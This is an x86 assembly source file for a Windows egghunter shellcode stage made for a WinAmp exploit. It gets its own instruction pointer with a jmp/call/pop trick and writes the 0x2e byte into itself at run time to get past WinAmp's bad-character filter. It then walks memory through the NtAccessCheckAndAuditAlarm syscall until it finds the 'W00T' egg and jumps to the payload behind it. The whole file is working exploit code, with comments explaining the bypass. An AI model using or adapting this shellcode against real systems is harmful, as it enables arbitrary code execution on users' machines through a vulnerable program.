;this egghunter contains parts made specifically for WinAmp

global _start
section .text
_start:
;Begin part for winamp
	jmp caller ;the next 3 instructions are here to get EIP
	
	get_eip:
	jmp pop_eip 

	caller:
	call get_eip ;this call will push EIP into the stack then will go to the EIP "popper" jmp

	pop_eip:
	pop edx	;pop EIP into EDX
	mov al, 0x2f	;\x2e is a bad character for winamp. since we need \x2e to issue in interrupt for syscall, i made this as a bypass. first load 0x2f into eax
	dec eax			;decrement eax so we hahve 0x2e
	mov byte [edx+0x13], al	;copy 0x2e into EDX+0x13. since our shellcode is in the stack, then we can modify exactly the corrupted byte with the needed one.
							;This also means that EIP point somewhere in the stack. We can always rely on the fact that this byte will be 0x13 bytes away from the popped EIP which is now in EDX
							;Popping EIP into EDX will also help us with egg hunting quickly. There are 3 instances of the egg in memmory, the one right after this page is the one that leads to execution
							;So, the next intruction will go directly to the page after the one where EIP resides.
;End Part for winamp
;Begin egghunter
inc_page:
	or dx, 0x0fff
inc_mem:
	inc edx
	push edx
	push 0x02  ;syscall for NtAccessCheckAndAuditAlarm. syscalls in windows take arguments in edx
	pop eax
	int 0x2e
	cmp al, 0x5
	pop edx
	jz inc_page

	mov eax, 0x57303054 ;egg W00T
	mov edi, edx
	scasd
	jne inc_mem
	scasd
	jne inc_mem

	jmp edi



